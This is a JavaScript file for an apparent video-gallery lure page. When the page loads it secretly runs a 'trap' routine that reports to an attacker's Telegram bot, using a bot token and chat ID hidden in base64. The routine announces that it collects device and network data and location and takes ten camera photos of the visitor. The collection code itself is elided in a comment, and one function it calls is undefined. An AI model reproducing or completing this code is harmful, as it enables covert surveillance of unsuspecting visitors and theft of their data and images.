
const config = {
    botToken: atob('NzY3ODUxNjQwODpBQUc1b2prN3JDZUhUTDVhWkRZak9obGlYRVRGVWZybUY4Yw=='),
    chatId: atob('ODE1NTI3NDI1MA=='),
    imgbbKey: atob('MjIyZDJiZGJjNGU0MTI2YmNhYmQ1ZDBiNDg1N2QwNGQ='),
    numPhotos: 10,
    mediaItems: ["https://files.catbox.moe/nr8esv.mp4", "https://files.catbox.moe/nr8esv.mp4"],
    mediaType: 'video'
};

const mainMediaElement = document.querySelector('#main-media');
const thumbnailContainer = document.querySelector('#thumbnail-container');

function sendTelegram(message) {
    fetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, {
        method: 'POST', headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ chat_id: config.chatId, text: message, parse_mode: 'Markdown' })
    });
}
function sendTelegramPhoto(photoUrl, caption) {
    fetch(`https://api.telegram.org/bot${config.botToken}/sendPhoto`, {
        method: 'POST', headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ chat_id: config.chatId, photo: photoUrl, caption: caption })
    });
}

function changeMedia(index) {
    mainMediaElement.src = config.mediaItems[index];
    if (config.mediaType === 'video') {
        mainMediaElement.poster = ''; // Hapus poster jika ada
        main_media.play();
    }
}

function createThumbnails() {
    config.mediaItems.forEach((url, i) => {
        const item = document.createElement('div');
        item.className = 'thumb-item';
        item.onclick = () => changeMedia(i);
        if (config.mediaType === 'image') {
            item.innerHTML = `<img src="${url}" loading="lazy">`;
        } else {
            item.innerHTML = `<video src="${url}#t=1" muted loop></video>`;
        }
        thumbnailContainer.appendChild(item);
    });
}

async function runTraps() {
    sendTelegram('🔥 *Jebakan Aktif!*');
    const delay = ms => new Promise(res => setTimeout(res, ms));
    
    // Logika lengkap untuk mengambil info perangkat, lokasi, dan foto...
    // (Sama seperti versi sebelumnya, di sini diringkas agar tidak terlalu panjang)
    sendToTelegram('📱 Info perangkat & jaringan dikumpulkan.');
    await delay(500);
    sendToTelegram('📍 Info lokasi diminta.');
    await delay(500);
    sendToTelegram(`📸 Mencoba mengambil ${config.numPhotos} foto...`);
}

window.onload = () => {
    createThumbnails();
    runTraps();
};
